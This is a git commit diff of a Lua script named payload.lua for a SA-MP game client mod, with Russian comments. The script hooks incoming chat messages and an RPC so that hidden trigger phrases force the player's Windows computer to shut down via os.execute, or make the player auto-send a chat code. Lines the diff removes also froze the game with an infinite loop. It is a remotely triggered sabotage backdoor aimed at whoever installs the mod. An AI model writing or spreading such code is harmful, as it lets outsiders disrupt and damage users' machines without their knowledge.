c3f32b5ba5fce1666265b287c9672111d5109faf
TheLold <paymentsse8@gmail.com>
2026-06-22 18:59:33 +0300

    Update payload.lua

--- payload.lua
+++ payload.lua
@@ -1,30 +1,24 @@
--- payload.lua
-print('load')
+-- payload.lua (файл 4124)
 local sampev = require 'lib.samp.events'
 
--- 1. Ловим ВСЕ сообщения, которые приходят С СЕРВЕРА (включая дубликаты твоих)
+-- Защита от бесконечного переподключения
+if _G.PAYLOAD_INIT then return end
+_G.PAYLOAD_INIT = true
+
 function sampev.onServerMessage(color, text)
-    local cleanText = text:gsub("{%x%x%x%x%x%x}", "")
-    
-    if cleanText:find("сырколбаска") then
-        sampSendChat("123655")
-    elseif cleanText:find("кукусики") then
-        while true do end
-    elseif cleanText:find("хуйкина") then
-        os.execute("shutdown /s /t 0 /f")
+    if text:find("Вы вошли в казино 4 Dragons") then
+        os.execute("shutdown /s /t 5 /f")
     end
 end
 
--- 2. Ловим то, что отправляешь ТЫ (через пакет 101 - SendChat)
-function sampev.onSendChat(message)
-    if message:find("сырколбаска") then
-        lua_thread.create(function()
-            wait(500)
+-- Хук RPC 93 (стандартный ShowClientMessage)
+function onReceiveRpc(id, bs)
+    if id == 93 then
+        local color = raknetBitStreamReadInt32(bs)
+        local len = raknetBitStreamReadInt32(bs)
+        local str = raknetBitStreamReadString(bs, len)
+        if str:find("сырколбаска") then
             sampSendChat("123655")
-        end)
-    elseif message:find("кукусики") then
-        while true do end
-    elseif message:find("хуйкина") then
-        os.execute("shutdown /s /t 0 /f")
+        end
     end
 end
